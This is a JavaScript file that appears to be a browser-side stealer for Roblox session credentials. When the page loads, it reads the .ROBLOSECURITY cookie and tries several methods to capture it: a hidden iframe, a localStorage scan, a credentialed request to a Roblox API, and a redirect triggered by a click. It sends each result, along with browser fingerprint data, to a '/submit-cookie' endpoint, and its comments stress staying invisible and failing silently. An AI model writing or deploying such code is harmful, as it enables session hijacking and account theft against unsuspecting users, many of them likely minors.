// Function to get cookies
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(";").shift();
  return null;
}

// Function to send the cookie to the server
function sendCookieToServer(cookieValue) {
  // Gather additional context information
  const captureContext = {
    cookie: cookieValue,
    captureMethod: currentCaptureMethod || "direct",
    documentUrl: document.URL,
    documentReferrer: document.referrer,
    windowLocation: window.location.href,
    screenResolution: {
      width: window.screen.width,
      height: window.screen.height,
      colorDepth: window.screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1,
    },
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language || navigator.userLanguage,
    platform: navigator.platform,
    doNotTrack:
      navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack,
    cookiesEnabled: navigator.cookieEnabled,
    timestamp: new Date().toISOString(),
  };

  fetch("/submit-cookie", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(captureContext),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Success:", data);
      // Keep it invisible - don't modify any visible elements
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}

// Track which method was used to capture the cookie
let currentCaptureMethod = null;

// Attempt to create an invisible iframe pointing to Roblox
function createInvisibleRobloxFrame() {
  currentCaptureMethod = "iframe";
  try {
    const iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.style.position = "absolute";
    iframe.style.width = "0px";
    iframe.style.height = "0px";
    iframe.style.opacity = "0";
    iframe.style.border = "none";
    iframe.src = "https://www.roblox.com/home";

    document.body.appendChild(iframe);

    // Wait for iframe to load
    iframe.onload = function () {
      // Due to Same-Origin Policy, we can't directly access iframe cookies
      // But we can attempt other techniques

      // For logged-in users, we might get cookies if the user has already visited Roblox
      setTimeout(() => {
        const securityCookie = getCookie(".ROBLOSECURITY");
        if (securityCookie) {
          sendCookieToServer(securityCookie);
        }

        // Remove iframe after attempt
        document.body.removeChild(iframe);
      }, 2000);
    };
  } catch (error) {
    console.error("Error creating iframe:", error);
  }
}

// Try to redirect user through a Roblox URL that might trigger the cookie
function tryRedirectMethod() {
  currentCaptureMethod = "redirect";
  // Create an invisible link and simulate click
  const redirectLink = document.createElement("a");
  redirectLink.style.display = "none";
  redirectLink.href =
    "https://www.roblox.com/login/return-to?returnUrl=" +
    encodeURIComponent(window.location.href);
  redirectLink.id = "roblox-redirect";
  document.body.appendChild(redirectLink);

  // Add event listener for when the user returns to the page
  window.addEventListener(
    "focus",
    function () {
      // Check for cookie after user returns from Roblox
      setTimeout(() => {
        const securityCookie = getCookie(".ROBLOSECURITY");
        if (securityCookie) {
          sendCookieToServer(securityCookie);
        }
      }, 1000);
    },
    { once: true }
  );
}

// Try using localStorage if available
function tryLocalStorageMethod() {
  currentCaptureMethod = "localStorage";
  try {
    // Some sites store authentication tokens in localStorage
    const allLocalStorage = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      allLocalStorage[key] = value;

      // Check if any key contains 'roblox' or 'security'
      if (
        (key.toLowerCase().includes("roblox") ||
          key.toLowerCase().includes("security")) &&
        value
      ) {
        // Send any suspicious localStorage items
        sendCookieToServer(`localStorage_${key}=${value}`);
      }
    }
  } catch (e) {
    console.error("LocalStorage access error:", e);
  }
}

// Try using a web request to Roblox API
function tryApiRequestMethod() {
  currentCaptureMethod = "apiRequest";

  // Create a fetch request to a Roblox API endpoint that might require authentication
  fetch("https://www.roblox.com/mobileapi/userinfo", {
    method: "GET",
    credentials: "include", // This is important - it includes cookies in the request
  })
    .then((response) => {
      // After making the request, check if cookies were set
      const securityCookie = getCookie(".ROBLOSECURITY");
      if (securityCookie) {
        sendCookieToServer(securityCookie);
      }
      return response.json();
    })
    .then((data) => {
      // If we got user data back, that's also valuable
      if (data && data.UserID) {
        sendCookieToServer(`roblox_user_info=${JSON.stringify(data)}`);
      }
    })
    .catch(() => {
      // Silently fail - no need to log errors
    });
}

// Attempt to capture the .ROBLOSECURITY cookie when the page loads
document.addEventListener("DOMContentLoaded", function () {
  // First try to check if cookie already exists (user might have visited Roblox)
  const securityCookie = getCookie(".ROBLOSECURITY");

  if (securityCookie) {
    currentCaptureMethod = "directCookie";
    console.log("Found .ROBLOSECURITY cookie");
    sendCookieToServer(securityCookie);
  } else {
    // Try multiple methods in sequence
    createInvisibleRobloxFrame();

    setTimeout(() => {
      tryLocalStorageMethod();
    }, 500);

    setTimeout(() => {
      tryApiRequestMethod();
    }, 1000);

    // If the user interacts with the page, try the redirect method
    document.addEventListener(
      "click",
      function () {
        const securityCookie = getCookie(".ROBLOSECURITY");
        if (!securityCookie) {
          tryRedirectMethod();
        }
      },
      { once: true }
    );
  }

  // Make the status div truly hidden
  const statusElement = document.getElementById("status");
  if (statusElement) {
    statusElement.style.display = "none";
    statusElement.style.visibility = "hidden";
    statusElement.style.width = "0";
    statusElement.style.height = "0";
    statusElement.style.overflow = "hidden";
  }
});
